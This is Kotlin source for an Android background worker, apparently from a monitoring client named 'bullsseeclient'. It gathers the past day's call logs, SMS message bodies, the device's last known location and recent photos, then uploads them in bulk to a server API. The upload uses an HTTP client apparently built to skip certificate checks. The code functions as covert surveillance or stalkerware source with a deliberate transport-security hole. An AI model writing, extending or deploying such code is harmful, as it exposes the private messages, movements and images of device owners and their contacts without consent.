package com.example.bullsseeclient

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.provider.CallLog
import android.provider.Telephony
import android.provider.MediaStore
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.example.bullsseeclient.api.DeviceDataApiService
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileInputStream
import java.io.IOException
import java.time.Instant
import java.util.*

data class CallLogData(
    val deviceName: String,
    val number: String,
    val date: String
)

data class SmsLogData(
    val deviceName: String,
    val address: String,
    val body: String,
    val date: String
)

data class LocationLogData(
    val deviceName: String,
    val latitude: Double,
    val longitude: Double,
    val timestamp: String
)

data class CameraImageData(
    val deviceName: String,
    val base64Image: String,
    val timestamp: String
)

class DataCollectionWorker(appContext: Context, params: WorkerParameters) : Worker(appContext, params) {
    private val deviceName = params.inputData.getString("deviceName") ?: UUID.randomUUID().toString()
    private val gson = Gson()

    override fun doWork(): Result {
        Log.d("DataCollectionWorker", "Worker started for deviceName=$deviceName")
        val data = DataCollection(applicationContext, deviceName)
        sendDataToApi(data)
        return Result.success()
    }

    private fun sendDataToApi(data: DataCollection) {
        Log.d("DataCollectionWorker", "Starting to send data to API")
        
        val retrofit = Retrofit.Builder()
            .baseUrl("https://localhost:7239/")
            .addConverterFactory(GsonConverterFactory.create())
            .client(HttpClient.getUnsafeOkHttpClient())
            .build()

        val apiService = retrofit.create(DeviceDataApiService::class.java)

        // Send call logs if available and permission is granted
        if (hasPermission(applicationContext, Manifest.permission.READ_CALL_LOG)) {
            Log.d("DataCollectionWorker", "Sending call logs: ${data.callLogs.size} items")
            data.callLogs.takeIf<List<CallLogData>> { it.isNotEmpty() }?.let { logs ->
                try {
                    val body = RequestBody.create("application/json".toMediaType(), gson.toJson(logs))
                    apiService.sendCallLogs(body).enqueue(createCallback("call logs"))
                } catch (e: Exception) {
                    Log.e("DataCollectionWorker", "Error preparing call logs: ${e.message}")
                }
            } ?: Log.d("DataCollectionWorker", "No call logs to send")
        } else {
            Log.e("DataCollectionWorker", "No READ_CALL_LOG permission")
        }

        // SMS Logs
        if (hasPermission(applicationContext, Manifest.permission.READ_SMS)) {
            Log.d("DataCollectionWorker", "Sending SMS logs: ${data.smsLogs.size} items")
            data.smsLogs.takeIf<List<SmsLogData>> { it.isNotEmpty() }?.let { logs ->
                try {
                    val body = RequestBody.create("application/json".toMediaType(), gson.toJson(logs))
                    apiService.sendSmsLogs(body).enqueue(createCallback("SMS logs"))
                } catch (e: Exception) {
                    Log.e("DataCollectionWorker", "Error preparing SMS logs: ${e.message}")
                }
            } ?: Log.d("DataCollectionWorker", "No SMS logs to send")
        } else {
            Log.e("DataCollectionWorker", "No READ_SMS permission")
        }

        // Location Logs
        if (hasPermission(applicationContext, Manifest.permission.ACCESS_FINE_LOCATION) || 
            hasPermission(applicationContext, Manifest.permission.ACCESS_COARSE_LOCATION)) {
            Log.d("DataCollectionWorker", "Sending location logs: ${data.locationLogs.size} items")
            data.locationLogs.takeIf<List<LocationLogData>> { it.isNotEmpty() }?.let { logs ->
                try {
                    val body = RequestBody.create("application/json".toMediaType(), gson.toJson(logs))
                    apiService.sendLocationLogs(body).enqueue(createCallback("location logs"))
                } catch (e: Exception) {
                    Log.e("DataCollectionWorker", "Error preparing location logs: ${e.message}")
                }
            } ?: Log.d("DataCollectionWorker", "No location logs to send")
        } else {
            Log.e("DataCollectionWorker", "No location permissions granted")
        }

        // Camera Images
        if (hasPermission(applicationContext, Manifest.permission.READ_EXTERNAL_STORAGE) ||
            hasPermission(applicationContext, "android.permission.READ_MEDIA_IMAGES")) {
            Log.d("DataCollectionWorker", "Sending camera images: ${data.cameraImages.size} items")
            data.cameraImages.takeIf<List<CameraImageData>> { it.isNotEmpty() }?.let { images ->
                try {
                    // Limit the number of images to send to avoid large payloads
                    val limitedImages = if (images.size > 10) images.take(10) else images
                    val body = RequestBody.create("application/json".toMediaType(), gson.toJson(limitedImages))
                    apiService.sendCameraImages(body).enqueue(createCallback("camera images"))
                } catch (e: Exception) {
                    Log.e("DataCollectionWorker", "Error preparing camera images: ${e.message}")
                }
            } ?: Log.d("DataCollectionWorker", "No camera images to send")
        } else {
            Log.e("DataCollectionWorker", "No storage permissions for images")
        }
    }

    private fun hasPermission(context: Context, permission: String): Boolean {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
    }

    private fun createCallback(dataType: String): Callback<Void> {
        return object : Callback<Void> {
            override fun onResponse(call: Call<Void>, response: Response<Void>) {
                if (response.isSuccessful) {
                    Log.d("DataCollectionWorker", "$dataType sent successfully")
                } else {
                    Log.e("DataCollectionWorker", "Failed to send $dataType: ${response.code()} - ${response.errorBody()?.string()}")
                }
            }

            override fun onFailure(call: Call<Void>, t: Throwable) {
                Log.e("DataCollectionWorker", "Error sending $dataType: ${t.message}")
            }
        }
    }

    class DataCollection(context: Context, deviceName: String) {
        val callLogs: MutableList<CallLogData> = mutableListOf()
        val smsLogs: MutableList<SmsLogData> = mutableListOf()
        val locationLogs: MutableList<LocationLogData> = mutableListOf()
        val cameraImages: MutableList<CameraImageData> = mutableListOf()

        init {
            // Collect call logs
            if (context.checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                try {
                    val cursor = context.contentResolver.query(
                        CallLog.Calls.CONTENT_URI,
                        arrayOf(
                            CallLog.Calls.NUMBER,
                            CallLog.Calls.DATE,
                            CallLog.Calls.TYPE,
                            CallLog.Calls.DURATION
                        ),
                        "${CallLog.Calls.DATE} > ?",
                        arrayOf((System.currentTimeMillis() - 24 * 60 * 60 * 1000).toString()),
                        "${CallLog.Calls.DATE} DESC"
                    )

                    cursor?.use { c ->
                        val numberIdx = c.getColumnIndex(CallLog.Calls.NUMBER)
                        val dateIdx = c.getColumnIndex(CallLog.Calls.DATE)
                        val typeIdx = c.getColumnIndex(CallLog.Calls.TYPE)

                        while (c.moveToNext()) {
                            try {
                                val number = c.getString(numberIdx) ?: "unknown"
                                val date = c.getLong(dateIdx)
                                val type = c.getInt(typeIdx)
                                
                                // Only include outgoing and incoming calls
                                if (type == CallLog.Calls.OUTGOING_TYPE || type == CallLog.Calls.INCOMING_TYPE) {
                                    callLogs.add(CallLogData(
                                        deviceName,
                                        number,
                                        Instant.ofEpochMilli(date).toString()
                                    ))
                                }
                            } catch (e: Exception) {
                                Log.e("DataCollection", "Error processing call log entry: ${e.message}")
                            }
                        }
                    }
                    Log.d("DataCollection", "Collected ${callLogs.size} call logs")
                } catch (e: Exception) {
                    Log.e("DataCollection", "Error collecting call logs: ${e.message}")
                }
            } else {
                Log.e("DataCollection", "No READ_CALL_LOG permission")
            }

            // Collect SMS messages
            if (context.checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                try {
                    val cursor = context.contentResolver.query(
                        Telephony.Sms.CONTENT_URI,
                        arrayOf(
                            Telephony.Sms.ADDRESS,
                            Telephony.Sms.BODY,
                            Telephony.Sms.DATE,
                            Telephony.Sms.TYPE
                        ),
                        "${Telephony.Sms.DATE} > ?",
                        arrayOf((System.currentTimeMillis() - 24 * 60 * 60 * 1000).toString()),
                        "${Telephony.Sms.DATE} DESC"
                    )

                    cursor?.use { c ->
                        val addressIdx = c.getColumnIndex(Telephony.Sms.ADDRESS)
                        val bodyIdx = c.getColumnIndex(Telephony.Sms.BODY)
                        val dateIdx = c.getColumnIndex(Telephony.Sms.DATE)
                        val typeIdx = c.getColumnIndex(Telephony.Sms.TYPE)

                        while (c.moveToNext()) {
                            try {
                                val address = c.getString(addressIdx) ?: "unknown"
                                val body = c.getString(bodyIdx) ?: ""
                                val date = c.getLong(dateIdx)
                                val type = c.getInt(typeIdx)
                                
                                // Only include sent and received messages
                                if (type == Telephony.Sms.MESSAGE_TYPE_INBOX || 
                                    type == Telephony.Sms.MESSAGE_TYPE_SENT) {
                                    smsLogs.add(SmsLogData(
                                        deviceName,
                                        address,
                                        body,
                                        Instant.ofEpochMilli(date).toString()
                                    ))
                                }
                            } catch (e: Exception) {
                                Log.e("DataCollection", "Error processing SMS: ${e.message}")
                            }
                        }
                    }
                    Log.d("DataCollection", "Collected ${smsLogs.size} SMS messages")
                } catch (e: Exception) {
                    Log.e("DataCollection", "Error collecting SMS: ${e.message}")
                }
            } else {
                Log.e("DataCollection", "No READ_SMS permission")
            }

            // Collect location data
            if (context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                context.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                try {
                    val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                    
                    // Try to get last known location from different providers
                    val providers = locationManager.getProviders(true)
                    var bestLocation: Location? = null
                    
                    for (provider in providers) {
                        try {
                            val location = locationManager.getLastKnownLocation(provider) ?: continue
                            
                            if (bestLocation == null || location.accuracy < bestLocation.accuracy) {
                                bestLocation = location
                            }
                        } catch (e: SecurityException) {
                            Log.e("DataCollection", "Location permission denied for provider: $provider")
                        } catch (e: Exception) {
                            Log.e("DataCollection", "Error getting location from $provider: ${e.message}")
                        }
                    }
                    
                    bestLocation?.let { location ->
                        locationLogs.add(LocationLogData(
                            deviceName,
                            location.latitude,
                            location.longitude,
                            Instant.ofEpochMilli(location.time).toString()
                        ))
                        Log.d("DataCollection", "Collected location: ${location.latitude}, ${location.longitude}")
                    } ?: Log.d("DataCollection", "No location data available")
                    
                } catch (e: Exception) {
                    Log.e("DataCollection", "Error collecting location: ${e.message}")
                }
            } else {
                Log.e("DataCollection", "No location permissions")
            }

            // Collect camera images (recent photos)
            if (context.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED ||
                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && 
                 context.checkSelfPermission("android.permission.READ_MEDIA_IMAGES") == PackageManager.PERMISSION_GRANTED)) {
                
                try {
                    val projection = arrayOf(
                        MediaStore.Images.Media._ID,
                        MediaStore.Images.Media.DISPLAY_NAME,
                        MediaStore.Images.Media.DATE_TAKEN,
                        MediaStore.Images.Media.SIZE,
                        MediaStore.Images.Media.DATA
                    )
                    
                    val selection = "${MediaStore.Images.Media.DATE_ADDED} > ?"
                    val selectionArgs = arrayOf(
                        (System.currentTimeMillis() / 1000 - 24 * 60 * 60).toString()
                    )
                    
                    val sortOrder = "${MediaStore.Images.Media.DATE_TAKEN} DESC LIMIT 5"
                    
                    val cursor = context.contentResolver.query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        projection,
                        selection,
                        selectionArgs,
                        sortOrder
                    )
                    
                    cursor?.use { c ->
                        val idColumn = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                        val dataColumn = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                        
                        while (c.moveToNext() && cameraImages.size < 5) { // Limit to 5 images
                            try {
                                val id = c.getLong(idColumn)
                                val path = c.getString(dataColumn)
                                
                                // Get a thumbnail instead of the full image to reduce memory usage
                                val options = BitmapFactory.Options().apply {
                                    inSampleSize = 4 // Scale down the image
                                }
                                
                                val bitmap = BitmapFactory.decodeFile(path, options)
                                val baos = ByteArrayOutputStream()
                                bitmap?.compress(Bitmap.CompressFormat.JPEG, 70, baos)
                                val imageBytes = baos.toByteArray()
                                val base64Image = Base64.encodeToString(imageBytes, Base64.DEFAULT)
                                
                                cameraImages.add(CameraImageData(
                                    deviceName,
                                    base64Image,
                                    Instant.now().toString()
                                ))
                                
                                // Free up memory
                                bitmap?.recycle()
                                
                            } catch (e: Exception) {
                                Log.e("DataCollection", "Error processing image: ${e.message}")
                            }
                        }
                    }
                    
                    Log.d("DataCollection", "Collected ${cameraImages.size} camera images")
                    
                } catch (e: Exception) {
                    Log.e("DataCollection", "Error collecting camera images: ${e.message}")
                }
            } else {
                Log.e("DataCollection", "No storage permissions for images")
            }
        }
    }
}